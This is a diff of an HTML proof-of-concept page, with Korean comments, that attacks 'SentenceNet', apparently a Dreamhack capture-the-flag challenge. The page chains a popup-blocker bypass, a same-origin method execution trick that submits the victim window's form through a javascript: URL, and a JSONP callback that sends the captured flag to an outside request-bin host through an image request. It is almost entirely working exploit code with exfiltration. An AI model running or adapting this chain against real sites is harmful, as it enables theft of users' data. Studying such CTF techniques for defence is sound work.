@@ -1,63 +1,70 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>SentenceNet PoC</title>
-<style>body{font:14px system-ui,Segoe UI,Roboto,sans-serif;max-width:860px;margin:40px auto;padding:0 16px}</style>
-<h1>SentenceNet – SOME + JSONP PoC</h1>
+<title>SentenceNet – SOME + JSONP PoC</title>
+<style>
+  body{font:14px system-ui,Segoe UI,Roboto,sans-serif;max-width:880px;margin:40px auto;padding:0 16px}
+  code{background:#f4f4f4;padding:.1em .3em;border-radius:4px}
+</style>
+<h1>SentenceNet PoC</h1>
 <ol>
-  <li>/post를 내부 봇 창으로 연다 → 입력값(플래그) 프리필</li>
-  <li>타겟 창에 <code>javascript:</code> URL을 쏴서 폼 제출(SOME)</li>
-  <li>/callback?callback=steal JSONP로 <code>info_value</code>를 우리 오리진에서 받음</li>
+  <li>타겟 <code>/post</code>를 내부 봇 창으로 오픈 (flag 프리필)</li>
+  <li>SOME로 타겟 창에서 폼 submit</li>
+  <li>JSONP <code>/callback?callback=steal</code>로 <code>info_value</code> 수집</li>
 </ol>
 
 <script>
+/*** ① 서버/수집지 설정 ***/
 const BASE  = 'http://host8.dreamhack.games:11606';         // 예: https://sentencenet.example
-const EXFIL = 'https://hkqibla.request.dreamhack.games?d='; 
-/** JSONP 콜백 (서버 정규식: [A-Za-z0-9.]+ ) */
+const EXFIL = 'https://xdaierj.request.dreamhack.games?d='; // RequestBin/콜랩 URL
+
+/*** ② JSONP 콜백: 서버 정규식 [A-Za-z0-9.]+ 에 맞는 이름만 가능 ***/
 function steal(payload){
   const info = payload && payload.info ? String(payload.info) : '';
+  // 외부로 유출
   new Image().src = EXFIL + encodeURIComponent(info);
 }
 
-/** 팝업 차단 대비: window.open 실패 시 앵커 클릭으로 오픈 */
+/*** ③ 팝업 차단 우회 오프너 ***/
 function openNamed(url, name){
   let w = window.open(url, name);
   if (!w) {
+    // anchor 클릭으로 대체
     const a = document.createElement('a');
-    a.href = url;
-    a.target = name;
-    a.rel = 'opener';
+    a.href = url; a.target = name; a.rel = 'opener';
     document.body.appendChild(a);
     a.click();
   }
 }
 
-/** 타겟 창에서 실행될 JS: 첫 번째 폼을 제출 */
+/*** ④ 타겟 창에서 실행할 JS: 첫 폼 submit ***/
 const JS_SUBMIT = "javascript:(function(){var f=document.forms&&document.forms[0];if(f){f.submit();}})()";
 
 (async () => {
   const WIN = "sentencenet_victim";
 
-  // 1) /post 열기 (내부 봇은 private IP라 input value에 flag가 사전 주입됨)
+  // 1) /post 열기 (내부/사설 IP인 봇 => input value에 /flag 내용 프리필)
   openNamed(BASE + "/post", WIN);
 
-  // 2) 약간 대기 후, 타겟 창 컨텍스트에서 폼을 submit시키는 javascript: URL 투척 (SOME)
-  await new Promise(r => setTimeout(r, 1000));
+  // 2) 타겟 창 문서가 로드될 시간을 준 뒤, SAME ORIGIN METHOD EXECUTION
+  await new Promise(r => setTimeout(r, 1200));
   const a = document.createElement('a');
   a.target = WIN;
-  a.href   = JS_SUBMIT;
+  a.href   = JS_SUBMIT;                // 타겟 창 컨텍스트에서 실행됨
   document.body.appendChild(a);
   a.click();
 
-  // 3) 서버가 info_value 갱신할 시간 주고 JSONP 호출
-  await new Promise(r => setTimeout(r, 1000));
+  // 3) 서버가 info_value 갱신할 시간 조금 더 대기 → JSONP 로드
+  await new Promise(r => setTimeout(r, 1200));
   const s = document.createElement('script');
+  // 콜백은 괄호/밑줄/하이픈 금지 → 'steal' 같이 단순 이름 사용
   s.src = BASE + "/callback?callback=steal&_=" + Date.now();
   document.head.appendChild(s);
 })();
 </script>
 
 <hr>
-<p><strong>디버그 팁</strong>:
-  콜백 정의 전송이 먹히는지 테스트하려면 <code>?callback=console.log</code>로 불러서
-  브라우저 콘솔에 <code>{info: ...}</code>가 찍히는지 먼저 확인해봐.
-  콜백 이름은 <code>[A-Za-z0-9.]+</code>만 허용(밑줄, 괄호, $, 하이픈 전부 금지).</p>
+<p><b>디버깅 팁</b>:
+  1) 먼저 <code>/callback?callback=console.log</code>로 불러서 콘솔에 <code>{info: ...}</code> 찍히는지 확인.
+  2) 콜백은 반드시 <u>JSONP 스크립트가 로드되기 전에</u> 전역에 정의돼 있어야 함.
+  3) 이름은 <code>[A-Za-z0-9.]+</code>만 허용(밑줄, 괄호, $, 하이픈 전부 금지).
+</p>
